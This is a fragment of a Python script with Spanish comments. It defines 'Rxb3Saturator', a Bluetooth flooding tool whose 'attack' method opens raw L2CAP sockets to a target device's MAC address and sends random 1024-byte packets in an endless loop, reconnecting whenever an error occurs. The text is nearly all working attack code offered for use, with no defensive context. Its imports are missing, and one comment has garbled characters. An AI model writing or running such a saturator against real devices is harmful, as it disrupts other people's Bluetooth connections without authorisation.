# Protocolo nativo L2CAP
BTPROTO_L2CAP = 0

class Rxb3Saturator:
    def __init__(self):
        self.running = False
        self.stats = {'packets': 0, 'errors': 0, 'start_time': time.time()}
    
    def attack(self, target_mac):
        while self.running:
            try:
                # Sockets nativos: No necesitan la librer√≠a 'bluetooth' externa
                s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_L2CAP)
                s.connect((target_mac, 0))
                while self.running:
                    s.send(os.urandom(1024))
                    self.stats['packets'] += 1
            except:
                self.stats['errors'] += 1
                time.sleep(0.05)

